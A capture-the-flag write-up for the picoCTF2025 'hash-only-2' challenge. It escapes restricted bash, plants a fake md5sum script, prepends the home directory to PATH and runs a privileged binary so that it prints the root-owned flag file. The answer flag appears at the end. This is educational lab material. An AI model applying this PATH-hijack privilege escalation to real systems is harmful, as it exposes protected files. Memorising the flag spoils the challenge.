# hash-only-2

## Overview:
* Binary exploitation
* Medium
* picoCTF2025

## Description:
Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!

Additional details will be available after launching your challenge instance.

## Write-up:
Launch the instance and connect to it.

Try some basic commands:
```bash
ctf-player@pico-chall$ ls
ctf-player@pico-chall$ ls -a
.  ..  .cache  .profile
ctf-player@pico-chall$ cd
-rbash: cd: restricted
ctf-player@pico-chall$ 
```
Seems like we in restricted bash mode. To exit it just type bash.

Now do the same thing we did in hash-only-1:
```bash
ctf-player@challenge:~$ cat > md5sum << 'EOF'
> #!/bin/bash
> echo ""
> cat /root/flag.txt
> EOF
ctf-player@challenge:~$ chmod +x md5sum 
ctf-player@challenge:~$ export PATH=$(pwd):$PATH
ctf-player@challenge:~$ echo $PATH
/home/ctf-player:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
ctf-player@challenge:~$ flaghasher 
Computing the MD5 hash of /root/flag.txt.... 

ctf-player@challenge:~$
```

## Flag:
```
picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_364b3672}
```
